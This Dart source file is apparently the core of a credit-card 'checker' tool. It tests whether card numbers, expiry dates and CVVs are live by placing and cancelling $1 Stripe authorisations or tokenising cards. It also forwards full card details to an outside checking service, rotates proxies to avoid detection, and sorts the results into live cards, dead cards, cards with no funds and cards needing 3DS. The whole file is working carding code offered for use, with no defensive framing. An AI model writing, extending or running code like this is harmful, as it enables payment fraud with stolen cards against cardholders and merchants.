import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';

import 'core.dart';
import 'models.dart';
import 'net.dart';

class CheckResult {
  const CheckResult({
    required this.status,
    required this.message,
    this.gateway = '',
    this.latencyMs = 0,
    this.piId = '',
  });
  final CheckStatus status;
  final String message;
  final String gateway;
  final int latencyMs;
  final String piId;
}

class CheckEngine {
  CheckEngine(this.cfg, {List<ProxyNode>? proxies}) : _proxies = proxies ?? const [];

  final Settings cfg;
  final List<ProxyNode> _proxies;
  final Map<String, http.Client> _clients = {};
  int _rr = 0;

  static const _authCents = 100;

  bool get _authOn => cfg.authOn;

  String get _pk => cfg.stripeKey.trim().isEmpty ? stripePk : cfg.stripeKey.trim();

  static String maskKey(String k) {
    if (k.length < 18) return k;
    return '${k.substring(0, 12)}...${k.substring(k.length - 4)}';
  }

  http.Client _client(ProxyNode? p) {
    final key = p == null ? 'direct' : '${p.host}:${p.port}';
    final cached = _clients[key];
    if (cached != null) return cached;

    final hc = HttpClient()
      ..connectionTimeout = Duration(seconds: cfg.timeoutSec)
      ..idleTimeout = const Duration(seconds: 20)
      ..userAgent = 'CChekerLive/$appVersion';

    if (p != null) {
      hc.findProxy = (uri) => 'PROXY ${p.host}:${p.port}';
      if (p.user.isNotEmpty) {
        hc.addProxyCredentials(
          p.host,
          p.port,
          'proxy',
          HttpClientBasicCredentials(p.user, p.pass),
        );
      }
    } else if (cfg.doh) {
      hc.connectionFactory = (u, ph, pp) => dohFactory(u, ph, pp, cfg.timeoutSec);
    }

    final c = IOClient(hc);
    _clients[key] = c;
    return c;
  }

  void dispose() {
    for (final c in _clients.values) {
      c.close();
    }
    _clients.clear();
  }

  ProxyNode? _pick() {
    if (!cfg.useProxies) return null;
    final pool = _proxies.where((p) => p.health != ProxyHealth.down).toList();
    if (pool.isEmpty) return null;
    _rr++;
    return pool[_rr % pool.length];
  }

  static CheckStatus mapStripe(String code, String decline) {
    if (code == 'insufficient_funds' || decline == 'insufficient_funds') {
      return CheckStatus.noFunds;
    }
    if (code == 'authentication_required' || decline == 'authentication_required') {
      return CheckStatus.need3ds;
    }
    if (code == 'incorrect_cvc' || code == 'invalid_cvc') return CheckStatus.cvcFail;
    if (code == 'incorrect_zip' || code == 'postal_code_invalid') return CheckStatus.avsFail;
    if (code == 'restricted_card' ||
        code == 'card_not_supported' ||
        code == 'currency_not_supported' ||
        code == 'transaction_not_allowed') {
      return CheckStatus.restricted;
    }
    if (code == 'expired_card' ||
        code == 'invalid_number' ||
        code == 'incorrect_number' ||
        code == 'lost_card' ||
        code == 'stolen_card' ||
        code == 'pickup_card' ||
        code == 'card_declined' ||
        code == 'generic_decline' ||
        code == 'do_not_honor') {
      return CheckStatus.dead;
    }
    return CheckStatus.unknown;
  }

  static String _short(Object e) {
    final s = e.toString().replaceAll('\n', ' ');
    return s.length > 80 ? s.substring(0, 80) : s;
  }

  Future<CheckResult> _auth(CreditCard card, ProxyNode? p) async {
    final sw = Stopwatch()..start();
    try {
      final r = await _client(p)
          .post(
            Uri.parse(stripePiUrl),
            headers: {
              'Authorization': 'Bearer ${cfg.cleanSk}',
              'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: {
              'amount': '$_authCents',
              'currency': 'usd',
              'capture_method': 'manual',
              'confirm': 'true',
              'automatic_payment_methods[enabled]': 'true',
              'automatic_payment_methods[allow_redirects]': 'never',
              'payment_method_data[type]': 'card',
              'payment_method_data[card][number]': card.pan,
              'payment_method_data[card][exp_month]': pad2(card.expMonth),
              'payment_method_data[card][exp_year]': pad2(card.expYear),
              if (card.cvv.isNotEmpty)
                'payment_method_data[card][cvc]': card.cvv,
            },
          )
          .timeout(Duration(seconds: cfg.timeoutSec));
      sw.stop();
      final ms = sw.elapsedMilliseconds;

      if (r.statusCode == 401 || r.statusCode == 403) {
        return CheckResult(
          status: CheckStatus.unknown,
          message: 'key invalida (${r.statusCode})',
          gateway: 'auth',
          latencyMs: ms,
        );
      }

      final map = r.body.isEmpty
          ? <String, dynamic>{}
          : jsonDecode(r.body) as Map<String, dynamic>;

      final err = map['error'];
      if (err is Map) {
        final code = (err['code'] ?? '').toString();
        final dec = (err['decline_code'] ?? '').toString();
        final msg = (err['message'] ?? '').toString();
        final texto = dec.isNotEmpty ? dec : (msg.isNotEmpty ? msg : code);
        return CheckResult(
          status: mapStripe(code, dec),
          message: texto.isEmpty ? 'declinada' : texto,
          gateway: 'auth',
          latencyMs: ms,
        );
      }

      final st = (map['status'] ?? '').toString();
      final piId = (map['id'] ?? '').toString();

      if (st == 'requires_capture' || st == 'succeeded') {
        if (piId.isNotEmpty && st == 'requires_capture') {
          unawaited(_cancel(piId, p));
        }
        return CheckResult(
          status: CheckStatus.live,
          message: 'autorizada \$1.00',
          gateway: 'auth',
          latencyMs: ms,
          piId: piId,
        );
      }
      if (st == 'requires_action' || st == 'requires_confirmation') {
        return CheckResult(
          status: CheckStatus.need3ds,
          message: 'pide 3ds',
          gateway: 'auth',
          latencyMs: ms,
          piId: piId,
        );
      }
      if (st == 'processing') {
        return CheckResult(
          status: CheckStatus.unknown,
          message: 'procesando',
          gateway: 'auth',
          latencyMs: ms,
        );
      }
      return CheckResult(
        status: CheckStatus.unknown,
        message: st.isEmpty ? 'sin estado' : 'pi $st',
        gateway: 'auth',
        latencyMs: ms,
      );
    } catch (e) {
      sw.stop();
      return CheckResult(
        status: CheckStatus.unknown,
        message: _short(e),
        gateway: 'auth',
        latencyMs: sw.elapsedMilliseconds,
      );
    }
  }

  Future<void> _cancel(String piId, ProxyNode? p) async {
    try {
      await _client(p)
          .post(
            Uri.parse('$stripePiUrl/$piId/cancel'),
            headers: {'Authorization': 'Bearer ${cfg.cleanSk}'},
          )
          .timeout(Duration(seconds: cfg.timeoutSec));
    } catch (_) {}
  }

  Future<Map<String, dynamic>?> lookupBin(String bin) async {
    if (bin.length < 6) return null;
    try {
      final r = await _client(null)
          .get(Uri.parse('$binlistUrl$bin'), headers: {'Accept-Version': '3'})
          .timeout(Duration(seconds: cfg.timeoutSec));
      if (r.statusCode != 200) return null;
      return jsonDecode(r.body) as Map<String, dynamic>;
    } catch (_) {
      return null;
    }
  }

  Future<CheckResult> _authOrToken(CreditCard card, ProxyNode? p) async {
    if (!_authOn) return _stripe(card, p);
    final a = await _auth(card, p);
    if (a.status == CheckStatus.unknown && a.message.contains('key invalida')) {
      final t = await _stripe(card, p);
      return CheckResult(
        status: t.status,
        message: '${t.message} · key mala',
        gateway: t.gateway,
        latencyMs: t.latencyMs,
      );
    }
    return a;
  }

  Future<CheckResult> _stripe(CreditCard card, ProxyNode? p) async {
    final sw = Stopwatch()..start();
    try {
      final r = await _client(p)
          .post(
            Uri.parse(stripeTokenUrl),
            headers: {
              'Authorization': 'Bearer $_pk',
              'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: {
              'card[number]': card.pan,
              'card[exp_month]': pad2(card.expMonth),
              'card[exp_year]': pad2(card.expYear),
              if (card.cvv.isNotEmpty) 'card[cvc]': card.cvv,
            },
          )
          .timeout(Duration(seconds: cfg.timeoutSec));
      sw.stop();
      final ms = sw.elapsedMilliseconds;

      if (r.statusCode == 401) {
        return CheckResult(
          status: CheckStatus.unknown,
          message: 'pk invalida (401)',
          gateway: 'token',
          latencyMs: ms,
        );
      }

      final map = r.body.isEmpty
          ? <String, dynamic>{}
          : jsonDecode(r.body) as Map<String, dynamic>;

      final err = map['error'];
      if (err is Map) {
        final code = (err['code'] ?? '').toString();
        final dec = (err['decline_code'] ?? '').toString();
        final msg = (err['message'] ?? '').toString();
        final texto = dec.isNotEmpty ? dec : (msg.isNotEmpty ? msg : code);
        return CheckResult(
          status: mapStripe(code, dec),
          message: texto.isEmpty ? 'error' : texto,
          gateway: 'token',
          latencyMs: ms,
        );
      }
      return CheckResult(
        status: CheckStatus.live,
        message: 'formato ok',
        gateway: 'token',
        latencyMs: ms,
      );
    } catch (e) {
      sw.stop();
      return CheckResult(
        status: CheckStatus.unknown,
        message: _short(e),
        gateway: 'token',
        latencyMs: sw.elapsedMilliseconds,
      );
    }
  }

  Future<CheckResult> _dorkill(CreditCard card, ProxyNode? p) async {
    if (cfg.dorkillKey.trim().isEmpty) {
      return const CheckResult(
        status: CheckStatus.unknown,
        message: 'falta api key',
        gateway: 'dorkill',
      );
    }
    final sw = Stopwatch()..start();
    try {
      final uri = Uri.parse(dorkillUrl).replace(queryParameters: {
        'key': cfg.dorkillKey.trim(),
        'card': '${card.pan}|${pad2(card.expMonth)}|${year4(card.expYear)}|${card.cvv}',
      });
      final r = await _client(p).get(uri).timeout(Duration(seconds: cfg.timeoutSec));
      sw.stop();
      final ms = sw.elapsedMilliseconds;
      final map = r.body.isEmpty
          ? <String, dynamic>{}
          : jsonDecode(r.body) as Map<String, dynamic>;
      final st = (map['status'] ?? '').toString().toLowerCase();
      final resp = (map['response'] ?? '').toString();

      if (st == 'live' || st == 'approved' || st == 'success') {
        return CheckResult(
          status: CheckStatus.live,
          message: resp.isEmpty ? 'aprobada' : resp,
          gateway: 'dorkill',
          latencyMs: ms,
        );
      }
      if (st == 'declined' || st == 'dead' || st == 'invalid') {
        return CheckResult(
          status: CheckStatus.dead,
          message: resp.isEmpty ? 'declinada' : resp,
          gateway: 'dorkill',
          latencyMs: ms,
        );
      }
      return CheckResult(
        status: CheckStatus.unknown,
        message: resp.isEmpty ? 'sin estado (${r.statusCode})' : resp,
        gateway: 'dorkill',
        latencyMs: ms,
      );
    } catch (e) {
      sw.stop();
      return CheckResult(
        status: CheckStatus.unknown,
        message: _short(e),
        gateway: 'dorkill',
        latencyMs: sw.elapsedMilliseconds,
      );
    }
  }

  Future<CheckResult> _cascade(CreditCard card, ProxyNode? p) async {
    final a = await _authOrToken(card, p);
    if (a.status == CheckStatus.live) return a;
    final b = await _dorkill(card, p);
    if (b.status == CheckStatus.live) return b;
    if (a.status == CheckStatus.dead && b.status == CheckStatus.dead) {
      return CheckResult(
        status: CheckStatus.dead,
        message: '${a.message} + ${b.message}',
        gateway: 'cascada',
        latencyMs: a.latencyMs + b.latencyMs,
      );
    }
    if (a.status == CheckStatus.dead) return a;
    if (b.status == CheckStatus.dead) return b;
    return a.status.rank <= b.status.rank ? a : b;
  }

  Future<CheckResult> check(CreditCard card) async {
    final max = cfg.retries + 1;
    var attempt = 0;
    var last = const CheckResult(status: CheckStatus.unknown, message: 'sin intentos');

    while (attempt < max) {
      final p = _pick();
      final r = _authOn
          ? await _authOrToken(card, p)
          : cfg.engine == 'both'
              ? await _cascade(card, p)
              : cfg.engine == 'dorkill'
                  ? await _dorkill(card, p)
                  : await _stripe(card, p);

      last = r;
      if (r.status != CheckStatus.unknown) return r;

      attempt++;
      if (attempt < max) {
        await Future.delayed(Duration(milliseconds: NetSense.i.backoff(attempt)));
      }
    }
    return last;
  }

  Future<String> probe(String url, {Map<String, String>? headers}) async {
    final sw = Stopwatch()..start();
    try {
      final r = await _client(null)
          .get(Uri.parse(url), headers: headers)
          .timeout(Duration(seconds: cfg.timeoutSec));
      sw.stop();
      return 'HTTP ${r.statusCode} · ${sw.elapsedMilliseconds}ms · ${r.body.length}B';
    } catch (e) {
      sw.stop();
      return 'fallo: ${_short(e)}';
    }
  }

  Future<String> exitInfo(ProxyNode p) async {
    try {
      final r = await _client(p)
          .get(Uri.parse('https://api.ipify.org?format=json'))
          .timeout(Duration(seconds: cfg.timeoutSec));
      if (r.statusCode != 200) return 'sin respuesta';
      final map = jsonDecode(r.body) as Map<String, dynamic>;
      return (map['ip'] ?? '?').toString();
    } catch (_) {
      return 'fallo';
    }
  }

  Future<String> fetchText(String url, {int maxBytes = 8388608}) async {
    final res = await _client(null)
        .get(Uri.parse(url))
        .timeout(Duration(seconds: cfg.timeoutSec));
    if (res.statusCode != 200) throw HttpException('HTTP ${res.statusCode}');
    final body = res.body;
    return body.length > maxBytes ? body.substring(0, maxBytes) : body;
  }
}
